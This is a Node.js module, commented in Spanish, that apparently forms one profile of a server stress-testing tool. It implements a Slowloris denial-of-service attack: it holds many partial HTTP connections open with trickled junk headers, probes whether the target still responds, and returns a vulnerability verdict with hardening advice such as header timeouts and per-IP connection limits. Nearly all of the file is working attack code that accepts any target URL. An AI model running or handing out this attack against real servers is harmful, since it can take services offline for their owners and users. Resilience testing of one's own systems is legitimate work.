/**
 * Slowloris — Connection exhaustion attack
 *
 * Abre muchas conexiones TCP y envía cabeceras HTTP parciales muy lentamente
 * para mantenerlas vivas sin completar nunca la request.
 * Un servidor vulnerable se queda sin slots de conexión y deja de responder.
 *
 * Mide:
 *   - Cuántas conexiones se mantienen abiertas
 *   - Si el servidor dropea conexiones inactivas (RESILIENTE) o las aguanta todas (VULNERABLE)
 *   - Si el servidor sigue respondiendo peticiones normales durante el ataque
 */
import net from 'net';
import tls from 'tls';
import http from 'http';
import https from 'https';
import { URL } from 'url';

export const meta = {
  id:          'slowloris',
  name:        'Slowloris',
  description: 'Connection exhaustion — mantiene conexiones TCP semi-abiertas para agotar el pool del servidor',
  risk:        'medium',
  defaultOpts: {
    connections: 150,    // sockets simultáneos
    duration:    30,     // segundos
    tickInterval: 5,     // segundos entre keepalive headers
    probeInterval: 8,    // segundos entre probes de salud
  },
};

export async function run({ target, opts = {}, hooks = {} }) {
  const { connections, duration, tickInterval, probeInterval } = { ...meta.defaultOpts, ...opts };
  const url     = new URL(target);
  const isHTTPS = url.protocol === 'https:';
  const host    = url.hostname;
  const port    = parseInt(url.port) || (isHTTPS ? 443 : 80);

  const sockets   = [];
  let alive       = 0;
  let dropped     = 0;
  let refused     = 0;
  let probes      = [];   // { ts, ms, ok }
  const startTime = Date.now();
  let stopped     = false;

  hooks.onStart?.({ connections, duration, target });

  // ── Open all connections ───────────────────────────────────────────────────
  const openConnection = () => new Promise(resolve => {
    const connectOpts = { host, port, rejectUnauthorized: false };
    const sock = isHTTPS
      ? tls.connect(connectOpts, onConnect)
      : net.connect(connectOpts, onConnect);

    function onConnect() {
      alive++;
      // Partial HTTP request — never send the final \r\n
      sock.write(
        `GET /?q=${Math.random().toString(36).slice(2)} HTTP/1.1\r\n` +
        `Host: ${host}\r\n` +
        `User-Agent: Mozilla/5.0 (compatible; bot)\r\n` +
        `Accept: */*\r\n` +
        `Connection: keep-alive\r\n`
      );
      sockets.push(sock);
      resolve();
    }

    sock.on('close',   () => { alive = Math.max(0, alive - 1); dropped++; });
    sock.on('error',   () => { alive = Math.max(0, alive - 1); refused++;  resolve(); });
    sock.on('timeout', () => sock.destroy());
    sock.setTimeout(duration * 1000 + 5000);
  });

  // Open connections in batches of 20 to avoid OS limits
  for (let i = 0; i < connections; i += 20) {
    const batch = Math.min(20, connections - i);
    await Promise.all(Array.from({ length: batch }, openConnection));
    await sleep(100);
    hooks.onProgress?.({ phase: 'opening', alive, total: connections, dropped, refused });
  }

  hooks.onAllOpen?.({ alive, dropped, refused });

  // ── Keepalive tick — send junk headers to stay alive ──────────────────────
  const keepalive = setInterval(() => {
    if (stopped) return;
    let sent = 0;
    for (const sock of sockets) {
      if (!sock.destroyed) {
        try { sock.write(`X-Padding: ${randomStr(8)}\r\n`); sent++; }
        catch { /* socket already dead */ }
      }
    }
    hooks.onTick?.({
      elapsed: elapsed(startTime),
      alive,
      dropped,
      refused,
      keptAlive: sent,
    });
  }, tickInterval * 1000);

  // ── Health probe — is the server still responding? ────────────────────────
  const prober = setInterval(async () => {
    if (stopped) return;
    const t0  = Date.now();
    const ok  = await probeServer(target, isHTTPS);
    const ms  = Date.now() - t0;
    probes.push({ ts: elapsed(startTime), ms, ok });
    hooks.onProbe?.({ ts: elapsed(startTime), ms, ok, alive, dropped });
  }, probeInterval * 1000);

  // ── Wait for duration ─────────────────────────────────────────────────────
  await sleep(duration * 1000);

  stopped = true;
  clearInterval(keepalive);
  clearInterval(prober);

  // Destroy all sockets
  for (const sock of sockets) {
    try { sock.destroy(); } catch {}
  }

  // ── Final health probe ────────────────────────────────────────────────────
  const finalT0 = Date.now();
  const finalOk = await probeServer(target, isHTTPS);
  const finalMs = Date.now() - finalT0;
  probes.push({ ts: elapsed(startTime), ms: finalMs, ok: finalOk, final: true });

  // ── Verdict ───────────────────────────────────────────────────────────────
  const maxAliveAtOnce    = alive + dropped;   // approximate peak
  const serverUnresponsive = probes.some(p => !p.ok);
  const serverRecovered    = finalOk;
  const droppedRatio       = connections > 0 ? dropped / connections : 0;

  let verdict, severity;
  if (serverUnresponsive && !serverRecovered) {
    verdict  = 'VULNERABLE — el servidor quedó sin responder y no se recuperó.';
    severity = 'critical';
  } else if (serverUnresponsive && serverRecovered) {
    verdict  = 'PARCIALMENTE VULNERABLE — el servidor dejó de responder pero se recuperó.';
    severity = 'high';
  } else if (droppedRatio > 0.6) {
    verdict  = 'RESILIENTE — el servidor dropeo la mayoría de conexiones (timeout activo).';
    severity = 'ok';
  } else if (droppedRatio > 0.2) {
    verdict  = 'MODERADO — el servidor dropea algunas conexiones pero aguanta muchas.';
    severity = 'medium';
  } else {
    verdict  = 'REVISAR — pocas conexiones dropeadas, posible ausencia de timeout.';
    severity = 'low';
  }

  return {
    profile:    'slowloris',
    target,
    severity,
    verdict,
    stats: {
      connectionsAttempted: connections,
      alive,
      dropped,
      refused,
      droppedRatio: Math.round(droppedRatio * 100),
      durationSeconds: duration,
      serverUnresponsive,
      serverRecovered,
    },
    probes,
    recommendations: buildRecommendations(severity),
  };
}

// ── Helpers ──────────────────────────────────────────────────────────────────
async function probeServer(target, isHTTPS) {
  return new Promise(resolve => {
    const mod = isHTTPS ? https : http;
    const req = mod.get(target, { timeout: 5000, rejectUnauthorized: false }, res => {
      res.resume();
      resolve(true);
    });
    req.on('error',   () => resolve(false));
    req.on('timeout', () => { req.destroy(); resolve(false); });
  });
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function elapsed(start) { return +((Date.now() - start) / 1000).toFixed(1); }
function randomStr(n) { return Math.random().toString(36).slice(2, 2 + n); }

function buildRecommendations(severity) {
  if (severity === 'ok') return [
    'Buen resultado. Mantén el timeout de conexión activo (recomendado: 10-30s).',
    'Considera un WAF con protección anti-DDoS L7 para mayor robustez.',
  ];
  return [
    'Configura un timeout de conexión en tu servidor (Nginx: client_header_timeout 10s, Uvicorn: --timeout-keep-alive 5).',
    'Limita conexiones simultáneas por IP: Nginx limit_conn, iptables hashlimit.',
    'Despliega un WAF o proxy inverso (Cloudflare, AWS WAF) delante del servidor.',
    'Considera un CDN con protección DDoS L7 activa.',
  ];
}
